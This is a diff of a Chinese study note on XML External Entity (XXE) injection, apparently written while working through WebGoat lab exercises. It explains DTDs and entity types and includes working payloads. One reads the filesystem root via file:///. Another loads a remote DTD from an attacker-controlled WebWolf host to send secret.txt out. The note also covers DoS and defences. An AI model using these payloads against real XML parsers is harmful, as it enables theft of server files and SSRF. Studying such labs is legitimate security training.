@@ -1,12 +1,10 @@
 # XXE（XML External Entities）
 
-## lesson2
-
-
+## lesson1
 
 ### 概念
 
-这节课将教您如何执行XML外部实体攻击，以及如何滥用和保护它。
+这节课将教您如何执行XML外部实体攻击，以及如何滥用。
 
 **目标**
 
@@ -20,11 +18,13 @@
 
 [XML实体注入学习](jianshu.com/p/a1ea825aa485)
 
-## lesson3
+## lesson2
 
-### 什么是XML实体?
+#### 什么是XML实体?
 
-XML都是固定好的
+ XML（可扩展标记语言）是一种非常流行的数据格式。从Web服务（XML-RPC，SOAP，REST）到文档（XML，HTML，DOCX）再到图像文件（SVG，EXIF数据），它都可以使用。要解释XML数据，应用程序需要XML解析器（也称为XML处理器）。 
+
+php中有一个函数`libxml_disble_entity_loader(true);`  true是不允许加载外部实体，false允许加载外部实体。
 
 XML实体允许定义将在解析XML文档时由内容替换的标记。一般有三种实体:
 
@@ -34,9 +34,97 @@ XML实体允许定义将在解析XML文档时由内容替换的标记。一般�
 
 **什么是DTD**：
 
-Document Type Definition 文档类型定义。增加XML 的约束性，XML是没有约束性的。
+Document Type Definition 文档类型定义。**增加XML 的约束性，XML是没有约束性的。**
 
 一个实体必须在文档类型定(Document Type Definition,DTD)中创建，让我们从一个例子开始:
+
+引用DTD文件本地文件用SYSTEM标识，外部的话用PUBLIC标识。
+
+1. 当DTD在xml内部声明时，要用使用`DOCTYPE`语法包装声明 
+
+   ```xml
+   <!DOCTYPE 根元素 [元素声明]>
+   ```
+
+   
+
+2.  当DTD位于xml文档外部，引用方法 
+
+   ```xml
+   <!DOCTYPE 根元素 SYSTEM "文件名">
+   ```
+
+   例子：
+
+    xml文档
+
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE note SYSTEM "note.dtd">
+   <note>
+   <to>George</to>
+   <from>John</from>
+   <heading>Reminder</heading>
+   <body>D
+   ```
+
+   DTD文档
+
+   ```python
+   
+   <!ELEMENT note (to,from,heading,body)>
+   <!ELEMENT to (#PCDATA)>
+   <!ELEMENT from (#PCDATA)>
+   <!ELEMENT heading (#PCDATA)>
+   <!ELEMENT body (#PCDATA)>
+   ```
+
+ENTITY是再引用外部实体要用的标识。
+
+**DTD构建实体**
+
+1. 内部实体声明
+
+```bash
+<!ENTITY 实体名称 "实体的值">
+```
+
+一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)
+ *DTD实体声明*
+
+```bash
+<!ENTITY writer "Bill Gates">
+<!ENTITY copyright "Copyright W3School.com.cn">
+```
+
+*xml调用*
+
+```xml
+<author>&writer;&copyright;</author>
+```
+
+1. 外部实体声明
+
+```bash
+<!ENTITY 实体名称 SYSTEM "URI/URL">
+```
+
+*DTD实体声明*
+
+```bash
+<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
+<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
+```
+
+*xml调用*
+
+```xml
+<author>&writer;&copyright;</author>
+```
+
+
+
+例子：
 
 ```xml
 <?xml version="1.0" standalone="yes" ?>
@@ -50,9 +138,16 @@ Document Type Definition 文档类型定义。增加XML 的约束性，XML是没
 
 所以无论你在哪里使用实体&js;解析器将用实体中定义的值替换它。
 
-### 什么是XXE（XML External Entity Injection 即xml外部实体注入）注入?
+用上面的XML做一个具体解释，第一行表明该文档符合XML1.0，第二行说明该文档使用author词汇表，author是根元素。（关键字SYSTEM 解析器将根据给出的URL寻找DTD，关键字PUBLIC 根据URI寻找DTD。）
+DTD的四种标记声明：
+ELEMENT xml元素类型声明
+ATTLIST 特定元素类型可设置的属性&属性的允许值声明
+ENTITY 可重用的内容声明
+NOTATION 不要解析的外部内容的格式声明。
 
-XML外部实体攻击，是针对解析XML输入的应用程序的一种攻击。当包含对**外部实体的引用的XML输入被弱配置的XML解析器处理时，就会发生这种攻击**。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。
+#### 什么是XXE（XML External Entity Injection 即xml外部实体注入）注入?
+
+XML外部实体攻击，是针对解析XML输入的应用程序的一种攻击。当包含对**外部实体的引用的XML输入被弱配置的XML解析器处理时，就会发生这种攻击**。在没有禁止外部实体加载，导致恶意web文件加载，这种攻击可能导致机密数据泄露（**文件读取**）、**命令执行**、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。
 
 攻击可以包括使用系统标识符中的file:  scheme或相对路径公开本地文件，这些文件可能包含密码或私有用户数据等敏感数据。由于攻击是相对于处理XML文档的应用程序发生的，所以攻击者可以使用这个受信任的应用程序转向其他内部系统，可能通过http(s)请求披露其他内部内容，或者对任何未受保护的内部服务发起CSRF攻击。在某些情况下，可以通过解除对恶意URI的引用来利用容易出现客户端内存损坏问题的XML处理器库，这可能允许在应用程序帐户下执行任意代码。其他攻击可以访问可能不会停止返回数据的本地资源，如果没有释放太多的线程或进程，可能会影响应用程序的可用性。
 
@@ -61,20 +156,26 @@ XML外部实体攻击，是针对解析XML输入的应用程序的一种攻击�
 一般来说，我们可以区分以下类型的XXE攻击:
 
 - Classic:在这种情况下，外部实体包含在局部DTD中
+
 - Blind:响应中不显示输出和错误
+
 - Error :尝试在错误消息中获取资源的内
 
-### 现代其他框架
+  
+
+# lesson4
+
+##### 现代其他框架
 
 在现代REST框架中，服务器可能能够接受您作为开发人员没有考虑到的数据格式。因此，这可能导致JSON端点容易受到XXE攻击。
 
 
 
-
-
 # XXE DOS 攻击
 
-什么是DOS攻击
+**什么是DOS攻击：**
+
+ DoS攻击是指故意的攻击网络协议实现的缺陷或直接通过野蛮手段残忍地耗尽被攻击对象的资源 
 
  使用相同的XXE攻击，我们可以对服务器执行DOS服务攻击。这种攻击的一个例子是: 
 
@@ -107,6 +208,11 @@ XML外部实体攻击，是针对解析XML输入的应用程序的一种攻击�
 ### Blind XXE
 
 在某些情况下，您将看不到任何输出，因为尽管您的攻击可能已经奏效，但该字段并未反映在页面的输出中。 或者您尝试读取的资源包含非法XML字符，这会导致解析器失败。 让我们从一个示例开始，在这种情况下，我们引用一个由我们自己的服务器控制的外部DTD。 
+
+**原理就是带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了。**
+
+**Blink XXE主要使用了DTD约束中的参数实体和内部实体。**
+**参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义**。
 
 作为攻击者，您可以控制WebWolf（可以是您控制下的任何服务器。），例如，您可以使用该服务器通过http://192.168.56.101:9090/landing对其进行ping操作
 
@@ -160,7 +266,7 @@ XML外部实体攻击，是针对解析XML输入的应用程序的一种攻击�
 
 在提交表单时，您将在照片中添加一条注释，并尝试执行带有注释字段的XXE注入。试着列出文件系统的根目录。 
 
-hide hits:
+**hide hits:**
 
 使用ZAP/Burp拦截请求并尝试包含自己的DTD , 包括可以如下 : <!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]> 
 
@@ -184,7 +290,7 @@ hide hits:
 
 ## lesson7
 
-#### 盲目XXE赋值
+### bllind xxe
 
 在前面的页面中，我们向您展示了如何用XXE攻击ping服务器，在这次作业中，尝试制作一个DTD，它将文件secret.txt的内容从WebGoat服务器上传到我们的WebWolf服务器上。您可以使用WebWolf来服务您的DTD。secret.txt位于这个位置的WebGoat服务器上，所以您不需要扫描所有目录和文件:
 **OS**									**操作系统的位置**
@@ -193,13 +299,13 @@ Linux							/home/webgoat/.webgoat - 8.0 - 8088465 / / XXE / secret.txt
 
 **hide hints:**
 
-首先把文件上传到攻击者的网站上， 在这种情况下，您不能将外部实体与内部实体组合在一起。 
+1. 首先把文件上传到攻击者的网站上， 在这种情况下，您不能将外部实体与内部实体组合在一起。 
 
- 使用参数实体执行攻击，例如:https://www.acunetix.com/blog/articles/xml-external-entixxe-limitations/ 
+2. 使用参数实体执行攻击，例如:https://www.acunetix.com/blog/articles/xml-external-entixxe-limitations/ 
 
-可以找到一个示例DTD [[webgoat base url]]/ webgoat /xxe/sampledtd，将这个DTD包含在xml注释中 
+3. 可以找到一个示例DTD [[webgoat base url]]/ webgoat /xxe/sampledtd，将这个DTD包含在xml注释中 
 
-用于注释时，请注意替换相应的url:  
+4. 用于注释时，请注意替换相应的url:  
 
 ```xml
 <?xml version="1.0"?>
@@ -209,15 +315,15 @@ http://192.168.56.101:9090/files/xinxin/test.dtd"> % remote;]>
 <comment><text>test&send;</text></comment>
 ```
 
- 要求借助webwolf来实现XXE盲注，将webgoat的指定目录文件传送到webwolf服务器。 
+5. 要求借助webwolf来实现XXE盲注，将webgoat的指定目录文件传送到webwolf服务器。 
 
- 指定了要获取的webgoat的文件（docker环境下） 
+​    指定了要获取的webgoat的文件（docker环境下） 
 
- `/home/webgoat/.webgoat-8.0.0.M24/XXE/secret.txt `
+   `/home/webgoat/.webgoat-8.0.0.M24/XXE/secret.txt `
 
- XXE外部注入用到的接收服务器（根据实际情况修改ip地址）： 
+​    XXE外部注入用到的接收服务器（根据实际情况修改ip地址）： 
 
- `http://192.168.56.101:9090/landing?text=contents_file`  
+   `http://192.168.56.101:9090/landing?text=contents_file`  
 
 * 几点说明
   1. 通过bp抓包可以看到，请求是XML的形式，是可以直接修改XML实现注入的
@@ -239,7 +345,7 @@ http://192.168.56.101:9090/files/xinxin/test.dtd"> % remote;]>
 
 ![](img/XXE5.png)
 
-## 小知识点
+## 补充
 
 1. XEE攻击再使用xml中引用实体产生的漏洞，可以利用引用实体而执行一些系统的命令进行：主机探测，端口扫描
 
@@ -295,3 +401,16 @@ http://192.168.56.101:9090/files/xinxin/test.dtd"> % remote;]>
 3. XXE防御清单
 
    [XML_External_Entity_Prevention_Cheat_Sheet.md]( https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md )
+
+# 漏洞练习总结清单
+
+## 考核点清单
+
+
+
+## 漏洞点清单
+
+
+
+## 漏洞利用效果
+
